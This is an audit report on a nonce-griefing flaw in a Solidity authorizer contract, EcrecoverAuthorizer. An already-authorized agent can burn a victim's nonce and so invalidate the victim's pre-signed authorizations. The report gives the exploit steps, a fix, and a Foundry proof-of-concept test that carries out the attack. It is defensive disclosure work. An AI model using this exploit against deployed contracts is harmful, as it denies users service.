Audit Report

## Title
Authorized Agent Can Grief Victim's Pending Pre-Signed Authorization by Consuming Nonce via No-Op Re-Authorization - (File: src/periphery/EcrecoverAuthorizer.sol)

## Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for, not just the authorizer themselves. Because the nonce at line 26 is incremented unconditionally on every successful call, an existing authorized agent of the victim can craft and submit their own signed `Authorization` struct referencing the victim as `authorizer`, consuming the victim's current nonce with a no-op state change. Any pending pre-signed authorization the victim has distributed off-chain with that nonce is permanently invalidated.

## Finding Description

**Code path:** `src/periphery/EcrecoverAuthorizer.sol`, lines 24–48.

The nonce is incremented at line 26 before signature verification:
```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```
The signer authorization check at lines 33–36 accepts any address for which `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)` is true:
```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```
There is no guard requiring the signer to be the `authorizer` themselves when the action is nonce-sensitive, and no check that the resulting `setIsAuthorized` call on Midnight produces an actual state change.

**Exploit flow:**

Preconditions:
- `isAuthorized[victim][attacker] == true` on Midnight.
- Victim has distributed off-chain: `Authorization(authorizer=victim, authorized=X, isAuthorized=true, nonce=N, deadline=T)`.
- `isAuthorized[victim][EcrecoverAuthorizer] == true` on Midnight (standard setup).

Steps:
1. Attacker constructs `Authorization(authorizer=victim, authorized=EcrecoverAuthorizer, isAuthorized=true, nonce=N, deadline=future)`.
2. Attacker signs this struct with their own private key.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.

Execution:
- Line 25: deadline passes.
- Line 26: `N == nonce[victim]` → passes; `nonce[victim]` becomes `N+1`.
- Lines 28–31: digest computed over attacker-crafted struct; `ecrecover` returns attacker's address.
- Line 32: attacker `!= address(0)` → passes.
- Line 34: `signer == victim` → false; `isAuthorized[victim][attacker]` → **true** → passes.
- Line 47: `Midnight.setIsAuthorized(EcrecoverAuthorizer, true, victim)` → no-op (already `true`).

Result: `nonce[victim]` is `N+1`. Any relayer or counterparty submitting the victim's pre-signed authorization with nonce `N` receives `InvalidNonce()`.

**Why existing checks fail:** The `Unauthorized` check is designed to allow authorized agents to relay the authorizer's own pre-signed messages, but it does not restrict agents from crafting and signing their own `Authorization` structs. There is no requirement that the signer be the `authorizer` themselves, and no guard preventing a no-op re-authorization from consuming the nonce.

## Impact Explanation
Any pending pre-signed `Authorization` distributed by the victim is permanently invalidated at the cost of one transaction. The victim must re-sign and re-distribute a new authorization with the incremented nonce. The attacker can repeat this indefinitely as long as they remain an authorized agent, creating a sustained DoS on all signature-based authorization flows for the victim. This maps to "Service unavailability or severe degradation under realistic attacker input" per RESEARCHER.md.

## Likelihood Explanation
Preconditions are realistic: users routinely authorize agents (routers, relayers, bots) on Midnight, and pre-signed authorizations are the primary off-chain UX pattern for `EcrecoverAuthorizer`. The attacker need only be one of the victim's existing authorized agents. The attack costs one transaction, requires no oracle manipulation, admin access, or leaked keys, and is repeatable every time the victim issues a new pre-signed authorization.

## Recommendation
Restrict the signer check in `EcrecoverAuthorizer.setIsAuthorized` to require that the signer is the `authorization.authorizer` themselves:
```solidity
require(signer == authorization.authorizer, Unauthorized());
```
The purpose of `EcrecoverAuthorizer` is to allow the authorizer to delegate via their own ECDSA signature, not to allow third-party agents to sign on their behalf. On-chain delegation is already handled by `Midnight.setIsAuthorized` directly. If agent-relaying of pre-signed messages is desired, a separate mechanism with explicit authorizer consent (e.g., a signed permit for the agent to relay) should be used, rather than reusing the broad `isAuthorized` delegation check.

## Proof of Concept
Minimal Foundry test (extending `EcrecoverAuthorizerTest`/`BaseTest`):

```solidity
function testAgentGriefsVictimNonce() public {
    address victim = borrower;
    address attacker = makeAddr("attacker");
    address X = makeAddr("X");

    // Standard setup: victim authorizes EcrecoverAuthorizer on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

    // Victim also authorizes attacker as an agent on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim pre-signs Authorization(authorizer=victim, authorized=X, isAuthorized=true, nonce=0)
    // and distributes it off-chain (simulated here)
    Authorization memory victimAuth = Authorization({
        authorizer: victim,
        authorized: X,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory victimSig = signAuthorization(victimAuth, victim);

    // Attacker crafts a no-op Authorization consuming nonce=0
    privateKey[attacker] = 0xDEAD; // give attacker a key
    Authorization memory attackAuth = Authorization({
        authorizer: victim,
        authorized: address(ecrecoverAuthorizer),
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory attackSig = signAuthorization(attackAuth, attacker);

    // Attacker submits — succeeds, burns nonce=0
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);

    // Victim's pre-signed authorization is now invalid
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```
